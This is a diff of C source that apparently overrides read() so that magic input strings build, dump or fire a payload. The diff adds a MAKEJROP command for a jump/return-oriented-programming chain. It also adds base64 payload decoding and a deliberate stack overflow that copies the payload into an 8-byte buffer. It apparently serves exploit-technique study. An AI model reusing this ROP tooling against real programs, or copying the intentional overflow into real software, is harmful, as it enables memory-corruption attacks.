@@ -4,13 +4,13 @@
 #include <stdio.h>	// For i/o
 #include <string.h>	// For str...() and mem...()
 
-#include "addresses.h"
 #include "base64.h"
 #include "payload.h"
 #include "strnstr.h"
 
 static const char s_basemagic[]	= "xyzzy";
 static const char s_makeload[]	= "MAKELOAD";
+static const char s_makejrop[]	= "MAKEJROP";
 static const char s_dumpload[]	= "DUMPLOAD";
 static const char s_overload[]	= "OVERLOAD";
 static const char s_overflow[]	= "OVERFLOW";
@@ -38,14 +38,17 @@ static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np, ssize_t nc) {
 } // falseEcho()
 
 // IDENTICAL to overflow(), but with two dumpload() calls for debugging.
-static void overload(Pointer src, size_t n, BaseAddressesPtr baseAddressesPtr) {
+static void overload(Pointer src, size_t n, BaseAddressesPtr bap) {
         char buffer[8] = {'E', 'A', 'S', 'T', 'E', 'R', ' ', 0 };
 
-	dumpload(src, baseAddressesPtr);
-	baseAddressesPtr->buf_base = &buffer;
+	assert(n == sizeof(Payload));
 
-	Pointer dst = dofixups(src, n, baseAddressesPtr);
-	dumpload(dst, baseAddressesPtr);
+	dumpload(src, bap);
+	bap->buf_base = &buffer;
+
+	Pointer dst = dofixups(src, n, bap);
+	dumpload(dst, bap);
+
 	memcpy(buffer, dst, n);
 } // overload()
 
@@ -61,11 +64,11 @@ ssize_t read(int fd, void *buf, size_t count) {
 	if (p) {
 		p += strlen(s_basemagic);
 
-		BaseAddresses baseAddresses;
 		Payload payload;
-
-		initBaseAddresses(&baseAddresses);
 		initload(&payload);
+
+		BaseAddresses baseAddresses;
+		initBaseAddresses(&baseAddresses);
 
 		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
 			p += strlen(s_makeload);
@@ -77,10 +80,45 @@ ssize_t read(int fd, void *buf, size_t count) {
 			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
 			((char *) buf)[result] = 0;
 		} // if
-		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
+		else if (!strncmp(s_makejrop, p, strlen(s_makejrop)))
+		{
+			p += strlen(s_makejrop);
+
+			ssize_t nc = makeload(&payload, &baseAddresses, p, result - (p - (char *)buf));
+			jropload(&payload, &baseAddresses);
+			result += falseEcho(&payload, p, result - (p - (char *)buf), nc);
+
+			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
+			((char *) buf)[result] = 0;
+		} // else if
+		else if (!strncmp(s_dumpload, p, strlen(s_dumpload))) {
+			p += strlen(s_dumpload);
+
+			unsigned char *s64 = p;
+                        size_t n256 = b64Decode(s64, b64Length(s64), (unsigned char *) &payload, 65535); // ToDo: Unknown upper bounds
+			assert(n256 == sizeof(Payload));
+
+			// This is a debugging animal
 			dumpload(&payload, &baseAddresses);
-		else if (!strncmp(s_overload, p, strlen(s_overload)))
-			overload(&payload, sizeof(payload), &baseAddresses);
+			result = 0;
+
+			// No output needed
+			((char *) buf)[result] = 0;
+		} // else if
+		else if (!strncmp(s_overload, p, strlen(s_overload))) {
+			p += strlen(s_overload);
+
+			unsigned char *s64 = p;
+                        size_t n256 = b64Decode(s64, b64Length(s64), (unsigned char *) &payload, 65535); // ToDo: Unknown upper bounds
+			assert(n256 == sizeof(Payload));
+
+			// This is a debugging animal
+                        overload(&payload, n256, &baseAddresses);
+			result = 0;
+
+			// No output needed (and shouldn't actually get here anyway)
+			((char *) buf)[result] = 0;
+		} // else if
 	} // if
 
 	return result;
@@ -98,6 +136,7 @@ int main(int argc, char **argv)
 
 	initload(&payload);
 	makeload(&payload, &baseAddresses, (argc > 1) ? argv[1] : NULL, (argc > 1) ? strlen(argv[1]) : 0);
+//	jropload(&payload, &baseAddresses);
 
 	char sPayload64[1024];
         size_t nPayload64 = b64Encode((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));
